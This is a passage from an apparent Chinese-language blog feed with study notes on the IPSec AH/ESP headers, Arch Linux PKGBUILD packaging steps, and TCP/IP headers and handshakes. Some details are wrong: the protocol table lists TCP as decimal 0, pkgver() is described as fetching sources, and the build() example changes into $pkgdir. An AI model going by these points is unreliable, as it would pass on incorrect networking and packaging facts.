    <content type="html"><![CDATA[<h2 id="IPSecVPN"><a href="#IPSecVPN" class="headerlink" title="IPSecVPN"></a>IPSecVPN</h2><h4 id="1-什么是IPSEC"><a href="#1-什么是IPSEC" class="headerlink" title="1.什么是IPSEC?"></a>1.什么是IPSEC?</h4><p>互联网安全协议(Internet Protocol Security)是一个协议包,透过对IP协议的分组进行加密和认证的网络传输协议族(一些相互关联的协议的集合)</p><p>IPsec主要由以下<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">协议</a>组成[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc2411-1">1]</a>[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc4308-2">2]</a>：</p><ol><li><p><a href="https://zh.wikipedia.org/zh-cn/IPsec#%E8%AE%A4%E8%AF%81%E5%A4%B4%EF%BC%88AH%EF%BC%89">认证头（AH）</a>，为IP<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E6%8A%A5">数据报</a>提供无连接<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7">数据完整性</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%B6%88%E6%81%AF%E8%AE%A4%E8%AF%81&action=edit&redlink=1">消息认证</a>以及防<a href="https://zh.wikipedia.org/wiki/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB">重放攻击</a>保护[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc2402-3">3]</a>[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc4302-4">4]</a>；</p></li><li><p><a href="https://zh.wikipedia.org/zh-cn/IPsec#%E5%B0%81%E8%A3%85%E5%AE%89%E5%85%A8%E8%BD%BD%E8%8D%B7%EF%BC%88ESP%EF%BC%89">封装安全载荷（ESP）</a>，提供机密性、数据源认证、无连接完整性、防重放和有限的传输流（traffic-flow）机密性[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc2406-5">5]</a>；</p></li><li><p><a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E9%9A%9B%E7%B6%B2%E8%B7%AF%E9%87%91%E9%91%B0%E4%BA%A4%E6%8F%9B">因特网密钥交换</a>（英语： <a href="https://zh.wikipedia.org/w/index.php?title=Internet_Key_Exchange&action=edit&redlink=1">Internet Key Exchange</a> ，简称IKE或IKEv2），为 AH、ESP 操作所需的 <a href="https://zh.wikipedia.org/wiki/%E5%AE%89%E5%85%A8%E9%97%9C%E8%81%AF">安全关联（SA）</a> 提供算法、数据包和密钥参数[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc2409_sec1-6">6]</a>。</p><p>IPsec协议工作在<a href="https://zh.wikipedia.org/wiki/OSI%E6%A8%A1%E5%9E%8B">OSI模型</a>的第三层，使其在单独使用时适于保护基于<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">TCP</a>或<a href="https://zh.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%8D%8F%E8%AE%AE">UDP</a>的协议（如<a href="https://zh.wikipedia.org/wiki/%E5%AE%89%E5%85%A8%E5%A5%97%E6%8E%A5%E5%AD%90%E5%B1%82">安全套接子层</a>（<a href="https://zh.wikipedia.org/wiki/SSL">SSL</a>）就不能保护UDP层的通信流）。这就意味着，与传输层或更高层的协议相比，IPsec协议必须处理可靠性和分片的问题，这同时也增加了它的复杂性和处理开销。相对而言，<a href="https://zh.wikipedia.org/wiki/SSL">SSL</a>&#x2F;<a href="https://zh.wikipedia.org/wiki/TLS">TLS</a>依靠更高层的<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">TCP</a>（OSI的第四层）来管理可靠性和分片。</p></li></ol><h3 id="2-认证头-AH-Authentication-Header-协议号51"><a href="#2-认证头-AH-Authentication-Header-协议号51" class="headerlink" title="2.认证头(AH(Authentication Header))(协议号51)"></a>2.认证头(AH(Authentication Header))(协议号51)</h3><p><strong>认证头</strong>（Authentication Header，<strong>AH</strong>）被用来保证被传输分组的完整性和可靠性。此外，它还保护不受<a href="https://zh.wikipedia.org/wiki/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB">重放攻击</a>。认证头试图保护IP数据报的所有字段，那些在传输IP分组的过程中要发生变化的字段就只能被排除在外。当认证头使用非对称数字签名算法（如RSA）时，可以提供不可否认性<br><img src="/images/AH%E5%8C%85%E7%BB%93%E6%9E%84.png" alt="认证头">字段含义：</p><ul><li>下一个头：标识被传送数据所属的协议。</li><li>载荷长度：认证头包的大小。</li><li>保留：为将来的应用保留（目前都置为0）。</li><li>安全参数索引：与IP地址一同用来标识安全参数。</li><li>串行号：单调递增的数值，用来防止重放攻击。</li><li>认证数据：包含了认证当前包所必须的数据。</li></ul><p>AH协议会对数据和ip包头进行校验,因此AH协议不能穿透NAT,并且AH协议不会对数据进行加密,只会对数据进行校验</p><h3 id="3-封装载荷-协议号50"><a href="#3-封装载荷-协议号50" class="headerlink" title="3.封装载荷(协议号50)"></a>3.封装载荷(协议号50)</h3><p><strong>封装安全载荷</strong>（Encapsulating Security Payload，<strong>ESP</strong>）协议对分组提供了源可靠性、完整性和保密性的支持。与AH头不同的是，IP分组头部不被包括在内。</p><p><img src="/images/esp%E5%8C%85%E7%BB%93%E6%9E%84.png" alt="封装载荷"></p><ul><li>安全参数索引：与IP地址一同用来标识安全参数</li><li>串行号：单调递增的数值，用来防止重放攻击。</li><li>载荷数据：如果没使用ESP的加密功能，则载荷数据域的内容是“下一个头”所指示的数据；如果使用了ESP的加密功能，则使用加密载荷数据和ESP尾部数据所得的密文作为payload data.</li><li>填充：某些块加密算法用此将数据填充至块的长度。</li><li>填充长度：以位为单位的填充数据的长度。</li><li>下一个头：标识载荷中封装的数据所属的协议。</li><li>认证数据：又叫做完整性校验值（ICV）。包含了认证当前包所必须的数据。</li></ul><p>ESP协议不校验ip包头,并且提供数据包的加密和校验,</p>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>archlinux打包软件包步骤</title>
    <link href="/2022/04/24/archlinux%E6%89%93%E5%8C%85%E8%BD%AF%E4%BB%B6%E5%8C%85%E6%AD%A5%E9%AA%A4/"/>
    <url>/2022/04/24/archlinux%E6%89%93%E5%8C%85%E8%BD%AF%E4%BB%B6%E5%8C%85%E6%AD%A5%E9%AA%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="Archlinux打包软件包步骤"><a href="#Archlinux打包软件包步骤" class="headerlink" title="Archlinux打包软件包步骤"></a>Archlinux打包软件包步骤</h1><h3 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h3><p>archlinux中的软件包都是通过makepkg来打包的,makepkg工具会读取一个PKGBUILD的脚本,按照脚本里面的规则自动构建软件包,打包完成后会在打包的目录下面生成一个.pkg.tar.zst的文件,这个文件可以直接使用pacman包管理工具安装(pacman -U name.pkg.tar.zst)</p><h3 id="2-打包前的准备"><a href="#2-打包前的准备" class="headerlink" title="2.打包前的准备"></a>2.打包前的准备</h3><p>首先要准本打包的工具,一般有base-devel这个软件包就足够了,通常makepkg在打包的过程中主要做以下几个步骤:</p><ul><li><p>1.检查软件包的相关依赖是否已经安装</p></li><li><p>2.从指定的服务器下载软件包对应的源代码</p></li><li><p>3.解压对应的源代码</p></li><li><p>4.编译源码,并将其安装在伪root目录下面</p></li><li><p>5.生成包的元数据(metadata)</p></li><li><p>6.将伪root环境打包为一个tar文件后用zstd将其压缩</p></li><li><p>7.将生成的打包好的软件保存至配置好的目录下面</p></li></ul><h3 id="3-PKGBUILD写法"><a href="#3-PKGBUILD写法" class="headerlink" title="3.PKGBUILD写法"></a>3.PKGBUILD写法</h3><p>  PKGBUILD脚本中一般有以下几个变量和函数</p><ul><li>变量</li></ul><p>  1.pkgdesc</p><p>  软件包的描述信息</p><p>  2.pkgdir</p><p>  软件包存储的目录</p><p>  3.pkgname</p><p>  软件包的名称</p><p>  4.pkgver</p><p>  软件包的版本</p><p>  5.source</p><p>  软件的源码</p><p>  6.arch</p><p>  软件适用的架构,如果和平台无关可以直接填写any</p><p>  7.license</p><p>  软件的许可证</p><p>  8.depens</p><p>  软件的依赖</p><p>  9.srcdir</p><p>  软件源码的目录</p><ul><li>函数</li></ul><p>  1.prepare()</p><p>  此函数会执行用于预处理源文件执行的命令,例如patch,此函数执行在build之前</p><p>  2.pkgver()</p><p>  此函数会抓取并解压源文件,执行完prepare函数后执行此函数</p><p>  3.build()</p><p>  此函数第一步先进入源代码的目录下,makepkg会在执行build函数之前更改当前目录为pkgdir目录</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-variable">$pkgdir</span>/<span class="hljs-variable">$pkgname</span>-<span class="hljs-variable">$pkgver</span>&quot;</span><br>./configure --prefix=/usr<br>make<br></code></pre></td></tr></table></figure><p>  4.package()</p><p>  此函数会将编译好的文件安装值伪root环境下面</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">make DESTDIR=<span class="hljs-string">&quot;<span class="hljs-variable">$pkgdir</span>/&quot;</span> install <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件和系统配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux软件打包</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TCP/IP协议</title>
    <link href="/2022/04/18/TCP-IP%E5%8D%8F%E8%AE%AE/"/>
    <url>/2022/04/18/TCP-IP%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="TCP-x2F-IP协议"><a href="#TCP-x2F-IP协议" class="headerlink" title="TCP&#x2F;IP协议"></a>TCP&#x2F;IP协议</h1><h4 id="1-什么是TCP-x2F-IP协议"><a href="#1-什么是TCP-x2F-IP协议" class="headerlink" title="1.什么是TCP&#x2F;IP协议?"></a>1.什么是TCP&#x2F;IP协议?</h4><p>TCP&#x2F;IP（Transmission Control Protocol&#x2F;Internet Protocol，传输控制协议&#x2F;网际协议）是指能够在多个不同网络间实现信息传输,网络通信的协议簇。TCP&#x2F;IP协议不仅仅指的是TCP 和IP两个协议，而是指一个由FTP、SMTP、TCP、UDP、IP等协议构成的协议簇， 只是因为在TCP&#x2F;IP协议中TCP协议和IP协议最具代表性，所以被称为TCP&#x2F;IP协议。</p><h4 id="2-TCP-x2F-IP协议的具体含义"><a href="#2-TCP-x2F-IP协议的具体含义" class="headerlink" title="2.TCP&#x2F;IP协议的具体含义"></a>2.TCP&#x2F;IP协议的具体含义</h4><p>从字面意义上讲，有人可能会认为 TCP&#x2F;IP 是指 TCP 和 IP 两种协议。实际生活当中有时也确实就是指这两种协议。然而在很多情况下，它只是利用 IP 进行通信时所必须用到的协议群的统称。具体来说，IP 或 ICMP、TCP 或 UDP、TELNET 或 FTP、以及 HTTP 等都属于 TCP&#x2F;IP 协议。他们与 TCP 或 IP 的关系紧密，是互联网必不可少的组成部分。TCP&#x2F;IP 一词泛指这些协议，因此，有时也称 TCP&#x2F;IP 为网际协议群。</p><p>互联网进行通信时，需要相应的网络协议，TCP&#x2F;IP 原本就是为使用互联网而开发制定的协议族。因此，互联网的协议就是 TCP&#x2F;IP，TCP&#x2F;IP 就是互联网的协议。</p><table><thead><tr><th>OSI七层模型</th><th>TCP&#x2F;IP模型</th><th>功能</th><th>TCP&#x2F;IP协议族</th></tr></thead><tbody><tr><td>应用层</td><td>应用层</td><td>提供即时通讯,文件传输,虚拟终端等</td><td>HTTP,FTP,TFTP,DNS,SMTP,POP3</td></tr><tr><td>表示层</td><td></td><td>提供数据的编码和数据的加密</td><td></td></tr><tr><td>会话层</td><td></td><td>建立进程间的联系</td><td></td></tr><tr><td>传输层</td><td>传输层</td><td>提供进程到进程,端对端的通信</td><td>TCP、UDP</td></tr><tr><td>网络层</td><td>网络层</td><td>实现数据包的路由</td><td>IP ICMP IGMP BGP RIP OSPF</td></tr><tr><td>数据链路层</td><td>数据链路层</td><td>提供差错校验</td><td>ARP RARP PPP</td></tr><tr><td>物理层</td><td></td><td>承载上层数据</td><td></td></tr></tbody></table><h4 id="3-网络数据格式"><a href="#3-网络数据格式" class="headerlink" title="3.网络数据格式"></a>3.网络数据格式</h4><p><img src="/images/packet.jpeg" alt=" 网络数据的封装"></p><p>网络中传输的数据包含两部分,一部分为协议头,存储了该层必要的控制信息,而且每一层都会将上一层的控制信息和上一层的数据部分作为本层的数据部分</p><h4 id="4-以太网协议"><a href="#4-以太网协议" class="headerlink" title="4.以太网协议"></a>4.以太网协议</h4><p><strong>以太网</strong>（英语：Ethernet）是一种<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA">计算机</a><a href="https://zh.wikipedia.org/wiki/%E5%B1%80%E5%9F%9F%E7%BD%91">局域网</a>技术。<a href="https://zh.wikipedia.org/wiki/IEEE">IEEE</a>组织的IEEE 802.3标准制定了以太网的技术标准，它规定了包括<a href="https://zh.wikipedia.org/wiki/OSI%E6%A8%A1%E5%9E%8B">物理层</a>的连线、电子信号和<a href="https://zh.wikipedia.org/wiki/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6">介质访问控制</a>的内容。以太网是目前应用最普遍的局域网技术，取代了其他局域网标准如<a href="https://zh.wikipedia.org/wiki/%E4%BB%A4%E7%89%8C%E7%8E%AF">令牌环</a>、<a href="https://zh.wikipedia.org/wiki/FDDI">FDDI</a>和<a href="https://zh.wikipedia.org/w/index.php?title=ARCNET&action=edit&redlink=1">ARCNET</a>。</p><p>以太网的标准<a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E7%B5%A1%E6%8B%93%E6%92%B2">拓扑</a>结构为<a href="https://zh.wikipedia.org/wiki/%E5%8C%AF%E6%B5%81%E6%8E%92%E6%8B%93%E6%92%B2">总线型拓扑</a>，但目前的快速以太网（<a href="https://zh.wikipedia.org/w/index.php?title=100BASE-T&action=edit&redlink=1">100BASE-T</a>、<a href="https://zh.wikipedia.org/wiki/1000BASE-T">1000BASE-T</a>标准）为了减少冲突，将能提高的网络速度和使用效率最大化，使用<a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E8%B7%AF%E4%BA%A4%E6%8F%9B%E5%99%A8">交换机</a>（Switch hub）来进行网络连接和组织。如此一来，以太网的拓扑结构就成了<a href="https://zh.wikipedia.org/wiki/%E6%98%9F%E5%9E%8B%E7%BD%91">星型</a>；但在逻辑上，以太网仍然使用总线型拓扑和<a href="https://zh.wikipedia.org/wiki/CSMA/CD">CSMA&#x2F;CD</a>（Carrier Sense Multiple Access&#x2F;Collision Detection，即载波多重访问&#x2F;碰撞侦测）的总线技术。</p><h5 id="4-1-以太网包头"><a href="#4-1-以太网包头" class="headerlink" title="4.1.以太网包头"></a>4.1.以太网包头</h5><ul><li><p>1.目标MAC地址(48bit)</p><p>数据帧目标主机的MAC地址</p></li><li><p>2.源MAC地址(48bit)</p><p>数据帧发送端主机的MAC地址</p></li><li><p>3.上层协议类型(16bit)</p><p>用于表示上层的协议如(0806表示arp，0800表示ip)</p></li><li><p>4.FCS帧校验序列(32bit)</p><p>数据帧的校验码,用于校验数据帧的完整性</p></li></ul><h4 id="5-IP协议"><a href="#5-IP协议" class="headerlink" title="5.IP协议"></a>5.IP协议</h4><p><strong>网际协议</strong>（英语：Internet Protocol，缩写：<strong>IP</strong>），又称<strong>互联网协议</strong>，是用于<a href="https://zh.wikipedia.org/wiki/%E5%B0%81%E5%8C%85%E4%BA%A4%E6%8F%9B">分组交换</a>数据网络的协议。</p><p>IP是在<a href="https://zh.wikipedia.org/wiki/TCP/IP%E5%8D%8F%E8%AE%AE%E6%97%8F">TCP&#x2F;IP协议族</a>中<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%B1%82">网络层</a>的主要协议，任务仅仅是根据源主机和目的主机的地址来传送数据。为此目的，IP定义了寻址方法和数据报的封装结构。第一个架构的主要版本为<a href="https://zh.wikipedia.org/wiki/IPv4">IPv4</a>，目前仍然是广泛使用的互联网协议，尽管世界各地正在积极部署<a href="https://zh.wikipedia.org/wiki/IPv6">IPv6</a>。</p><h5 id="5-1-IP包头"><a href="#5-1-IP包头" class="headerlink" title="5.1.IP包头"></a>5.1.IP包头</h5><ul><li><p>1.版本号(4bit)</p><p>0100为IPV4,0110为IPV6</p></li><li><p>2.首部长度(4bit)</p><p>指明整个ip包头的长度,ip包头的长度介于20-60个字节之间,因此此字段的单位为四字节</p></li><li><p>3.服务类型(8bit)</p><p>服务器类型（TOS）字段，其中前3个bit表示优先权（现在已经忽略该字段），随后的4个bit表示服务类型，按顺序分别表示为最小时延、最大吞吐量、最高可靠性、最小费用四种。这个4个bit中最多只能有1个bit置位，如果全是0则表示一般服务。最有1个bit为未用位，必须置0</p></li><li><p>4.总长度(16bit)</p><p>表示整个ip包的总字节数</p></li><li><p>5.标识符(16bit)</p><p>16bit的标识字段唯一的标识主机发送的每一份数据报，由于数据在发送时会进行分片,到达目标主机后会将数据包分片进行重组,此标识符用于区别该分片属于哪个数据包,由主机生成具有唯一性。通常每发送一份报文该值加1。该值在数据包分片时，会复制到每一个片中。所以在重组分片包的时候会观察该值，把该值相同的分片收集到一起重组，后面会继续讨论分片。</p></li><li><p>6.标志位(3bit)</p><p>3bit的标识字段每一位都有特定的含义，该字段主要用来分片和重组。第1个bit为保留位（Reserved Bit），一般置位0。第2个bit为不分片位（Don’t Fragment），该位在置1时表示不分片。第3个bit为更多片位（More Fragment），该位表示后面是否还有更多的分片，置位1时表示后面还有，所以除了最后一片报文，其他分片报文该位全部置1。</p></li><li><p>7.片偏移(13bit)</p><p>用于表明次数据包首部偏移数据包真正首部多少个字节,假如发送一个原始数据包1461个byte,那么第一个数据包分片为0,第二个数据包分片为1460</p></li><li><p>8.ttl值(8bit)</p><p>用于表示最多经过的路由器的数量,防止数据包在互联网上一直转发,消耗网络资源,ttl没经过一个路由器就会减1,当ttl减小到0时路由器就会将数据包丢弃,并向源主机回应一个icmp报文,表示ttl超时</p></li><li><p>9.协议号(8bit)</p><p>用于表示上层的协议如</p><table><thead><tr><th align="center">十进制</th><th align="center">十六进制</th><th align="center">关键字</th><th align="center">协议</th><th align="center">引用</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">0x06</td><td align="center">TCP</td><td align="center"><a href="https://zh.m.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE"> 传输控制协议（TCP）</a></td><td align="center"><a href="https://tools.ietf.org/html/rfc793">RFC 793</a></td></tr><tr><td align="center">1</td><td align="center">0x01</td><td align="center">ICMP</td><td align="center"><a href="https://zh.m.wikipedia.org/wiki/%E4%BA%92%E8%81%94%E7%BD%91%E6%8E%A7%E5%88%B6%E6%B6%88%E6%81%AF%E5%8D%8F%E8%AE%AE">互联网控制消息协议（ICMP）</a></td><td align="center"><a href="https://tools.ietf.org/html/rfc792">RFC 792</a></td></tr><tr><td align="center">17</td><td align="center">0x11</td><td align="center">UDP</td><td align="center"><a href="https://zh.m.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%8D%8F%E8%AE%AE">用户数据报协议（UDP）</a></td><td align="center"><a href="https://tools.ietf.org/html/rfc768">RFC 768</a></td></tr></tbody></table></li><li><p>10.首部校验和(16bit)</p><p>用于校验ip首部是否正确,不对ip包的数据部分进行校验</p><p>计算方法：首先把首部中的该字段全部置0，然后对首部中的每个16bit进行反码求和，得到的值就是该字段的值，填入后。将该数据包发给接收端后，接收端将进行相同的操作，对每个16bit进行反码求和（此时首部校验和字段为非0字段），所以计算后的值若为全1表示正确，否则表示收到的数据包不正确，动作为丢弃。</p></li><li><p>11.源IP地址</p><p>发送端的ip地址</p></li><li><p>12.目标IP地址</p><p>接受方的ip地址</p></li><li><p>13.可选项</p></li></ul><h5 id="5-2-IP地址"><a href="#5-2-IP地址" class="headerlink" title="5.2.IP地址"></a>5.2.IP地址</h5><p>IP地址标识着网络中一个系统的位置。每个IP地址都是由两部分组成：网络号和主机号。网络号标识一个物理的网络，同一个网络上所有的主机需要同一个网络号，该号在整个互联网是唯一的；主机号是网络中的一个工作端、服务器、路由器其他TCP&#x2F;IP主机。对于一个网络号来说主机号是唯一的。每个TCP&#x2F;IP主机由一个逻辑IP地址确定。</p><p>IP地址有两种表示方法：二进制表示、点分十进制表示。<br>每个IP地址为4个字节，由4个8位域组成，称之为8位体。</p><h5 id="5-3-IP地址划分"><a href="#5-3-IP地址划分" class="headerlink" title="5.3.IP地址划分"></a>5.3.IP地址划分</h5><p>IP地址划分为5类</p><ul><li>1.A类地址（ 0.0.0.0 - 127.255.255.255 ）以”0”头，网络段长度为8位，其中可变部分的长度为7位；主机段长度为24位。7位的可变网络段可识别2^7&#x3D;128 (0~127)个网络，其中0和127另有用途，故只有126个可用的A类网络地址。另外，主机位全”0”代表网络本身，全”1”代表网内广播，因此一个A类网络地址可识别的可分配地址有 2^24-2 个。</li><li>2.B类地址（ 128.0.0.0 - 191.255.255.255 ）以”10”开头，网络段长度为16位，可变部分的长度为14位；主机段长度为16位。14位的可变网络段可以识别的网络数为 2^14 个。另外，主机位全”0”与全”1”功能同A类地址，因此一个B类网络可以分配地址有 2^16-2 个。</li><li>3.C类地址（ 192.0.0.0 - 223.255.255.255 ）以”110”开头，网络段长度为24位，其中可变部分的长度为21位；主机段长度为8位。21位的可变网络段可以识别的网络数为 2^21 个。可分配的主机地址是 2^8-2 个。</li><li>4.D类地址（ 224.0.0.0 - 239.255.255.255 ）为组播地址，使用”1110”开头，不分网络段和主机段，有 2^28 个组播地址。用于标识预先定义的一组主机。主机使用组播通信时，可以将组播数据报一次性发送给所有同组的主机。</li><li>5.E类地址（ 240.0.0.0 - 255.255.255.255 ）是保留地址，用于研究使用。以”1111”开头，不区分网络段和主机段，其中32位全1代表本网络内广播，因此E类地址共有 2^28-1 个。</li></ul><p>ip地址又有私有ip地址(主要为了解决ip地址不够用的问题)和特殊ip地址</p><p><strong>私有IP地址</strong></p><p>A类私有ip地址(10.0.0.0&#x2F;8)</p><p>B类私有ip地址(172.16.0.0&#x2F;12)</p><p>C类私有ip地址(192.168.0.0&#x2F;16)</p><p><strong>特殊ip地址</strong></p><p>127.0.0.0&#x2F;8,本地回环地址,用于表示本机,常用于测试</p><p>169.254.0.0&#x2F;16,主要用于DHCP服务器出问题时本地局域网计算机可以继续进行通讯</p><h4 id="6-TCP-x2F-UDP协议"><a href="#6-TCP-x2F-UDP协议" class="headerlink" title="6.TCP&#x2F;UDP协议"></a>6.TCP&#x2F;UDP协议</h4><p><strong>6.1.TCP协议</strong></p><p><strong>传输控制协议</strong>（英语：<strong>T</strong>ransmission <strong>C</strong>ontrol <strong>P</strong>rotocol，缩写：<strong>TCP</strong>）是一种面向连接的、可靠的、基于<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AF%80%E6%B5%81">字节流</a>的<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E5%B1%82">传输层</a>通信协议，由<a href="https://zh.wikipedia.org/wiki/IETF">IETF</a>的<a href="https://zh.wikipedia.org/wiki/RFC">RFC</a> <a href="https://tools.ietf.org/html/rfc793">793</a>定义。在简化的计算机网络<a href="https://zh.wikipedia.org/wiki/OSI%E6%A8%A1%E5%9E%8B">OSI模型</a>中，它完成第四层传输层所指定的功能。</p><h5 id="TCP包头-20byte-60byte"><a href="#TCP包头-20byte-60byte" class="headerlink" title="TCP包头(20byte~60byte)"></a>TCP包头(20byte~60byte)</h5><ul><li><p>1.源端口(16bit)</p><p>发送端的端口号</p></li><li><p>2.目的端口(16bit)</p><p>目标端的端口号</p></li><li><p>3.序号(32bit)</p><p>顺序号，4个字节，用来标识从 TCP 源端向 TCP 目的端发送的数据字节流，它表示在这个报文段中的第一个数据字节的顺序号。如果将字节流看作在两个应用程序间的单向流动，则 TCP 用顺序号对每个字节进行计数。序号是 32bit 的无符号数，<strong>序号到达 (2^32) － 1 后又从 0 开始。</strong>当建立一个新的连接时， SYN 标志变 1 ，顺序号字段包含由这个主机选择的该连接的初始顺序号 ISN （ Initial Sequence Number ）</p></li><li><p>4.确认号(32bit)</p><p>确认号，4个字节，包含发送确认的一端所期望收到的下一个顺序号。因此，确认序号应当是上次已成功收到数据字节顺序号加 1 。只有 ACK 标志为 1 时确认序号字段才有效</p></li><li><p>5.数据偏移量(4bit)</p><p>包头长度(单位为4字节)</p></li><li><p>6.保留位(6bit)</p><p>保留区域，6位，保留给将来使用，目前必须置为 0</p></li><li><p>7.控制位(6bit)</p><p>URG,为1表示紧急指针值有效,反之无效</p><p>ACK,为1表示确认号有效</p><p>PSH,为1表示带有PUSH标志的数据,指示接收方应该尽快将这个报文段交给应用层而不用等待缓冲区装满。</p><p>RST,用于复位,表示出现了主机崩溃或者错误连接</p><p>SYN,同步序号,为1表示连接请求,用于建立连接和使顺序号同步</p><p>FIN,用于释放连接</p></li><li><p>8.窗口大小(16bit)</p><p>窗口大小，2个字节，表示从确认号开始，本报文的源方可以接收的字节数，即源方接收窗口大小。窗口大小是一个 16bit 字段，因而窗口大小最大为 65535（2^16 - 1）</p></li><li><p>9.校验和(16bit)</p><p>校验和，2个字节，对整个的 TCP 报文段<strong>（包括 TCP 头部和 TCP 数据）</strong>，以 16 位字进行计算所得。这是一个强制性的字段，要求由发送端计算和存储，并由接收端进行验证</p></li><li><p>10.紧急指针(16bit)</p><p>紧急指针，2个字节，是一个正的偏移量，和顺序号字段中的值相加表示紧急数据最后一个字节的序号。 TCP 的紧急方式是发送端向另一端发送紧急数据的一种方式。 只有当URG 标志置 1 时紧急指针才有效</p></li><li><p>11.可选项</p></li></ul><p><strong>TCP三次握手</strong>(重点)</p><p>基本过程如下</p><p>1.Client将tcp中标志位SYN置为1,并初始化一个序列号x,用于客户端到服务端的会话,发送给服务端请求连接,此时客户端进入SYN_SEND状态</p><p>2.Server收到Client发来的请求连接报文后,会将ACK置为1,并将ack置为x+1,并初始化一个序列号y,用于以后服务端到客户端的会话表示接受连接(客户端到服务端),并将SYN置为1请求和客户端连接(服务端到客户端),此时Server进入SYN_RECV状态</p><p>3.Client收到报文后,客户端到服务端完成连接(Client进入到ESTABLISHED状态),并将ACK置为1表示接受连接(服务端到客户端),服务端收到后,服务端到客户端也完成连接,3次握手完成,此时Client和Server都进入ESTABLISHED状态</p><pre><code class=" mermaid">sequenceDiagram Client-&gt;&gt;+Server:SYN=1,seq=x Server-&gt;&gt;+Client:SYN=1,seq=y,ack=x+1,ACK=1 Client-&gt;&gt;+Server:ACK=1,ack=y+1</code></pre><p><strong>tcp建立连接为什么要三次握手?</strong></p><p>三次握手的目的是建立可靠的通信信道,而可靠的通信信道最基础的就是发送者和接受者发送接受都正常,即三次握手最主要的目的就是确认客户端和服务端发送和接受都是正常的,</p><p>第一次握手,客户端发送出建立连接报文后,自己什么都确认不了,但是服务端一旦接受到客户端发来的申请建立连接报文后,就可以确认客户端发送正常,自己接受正常</p><p>第二次握手,服务端发送确认建立连接报文后,客户端一旦接受到了就可以确认,客户端可以确认自己发送接受正常,对方发送和接受都正常</p><p>第三次握手,客户端发送出确认连接报文后,服务端一旦接收到,就可以确认自己发送接受正常,对方发送和接受都正常,</p><p>至此,客户端和服务端都能确认对方和自己发送和接收数据都是正常的。</p><p><strong>tcp三次握手可以携带数据吗?</strong></p><p>第三次握手的时候，是可以携带数据的。但是，<strong>第一次、第二次握手绝对不可以携带数据</strong></p><p>假如第一次握手可以携带数据的话，如果有人要恶意攻击服务器，那他每次都在第一次握手中的 SYN 报文中放入大量的数据，然后疯狂重复发 SYN 报文的话，这会让服务器花费很多时间、内存空间来接收这些报文。</p><p><strong>TCP四次挥手</strong>（重点)</p><p>Client或Server均可发起断开连接,这里以客户端发起释放连接为例</p><p>1.Client将标志位FIN置为1,并将序列号seq&#x3D;u(假设此时序列号为u)发送给Server,此时Client进入FIN_WAIT-1状态</p><p>2.Server收到报文后,将ACK标志位置为1,将ack置为u+1发送给Client,表示Server已经接受到Client发来的断开连接请求,Client收到该报文后会进入FIN_WAIT-2状态,此时TCP进入到半连接状态,Client到Server的连接释放,此时Server进入CLOSE-WAIT,此时Server将剩下要发完的数据依次全部发送给Client</p><p>3.Server将剩余要发送完的数据发送完成后,将FIN标志为置为1,ACK置为1,发送给Client,表示释放连接(服务端到客户端),</p><p>4.Client收到该报文后,将标志位ACK置为1,表示接受释放连接,此时Server到客户端的连接释放,TCP4次挥手完成</p><pre><code class=" mermaid">sequenceDiagramClient-&gt;&gt;+Server:FIN=1,seq=uServer-&gt;&gt;+Client:ACK=1,ack=u+1,seq=vServer--&gt;&gt;+Client:DATAServer-&gt;&gt;+Client:FIN=1,ACK=1,seq=w,ack=u+1Client-&gt;&gt;+Server:ACK=1,ack=w+1,seq=u+1</code></pre><p><strong>为什么TCP断开连接要进行4次挥手？</strong></p><p>TCP断开连接过程中的四次挥手主要就是为了双方都能确认对方都没有数据发送了。</p><p>由于 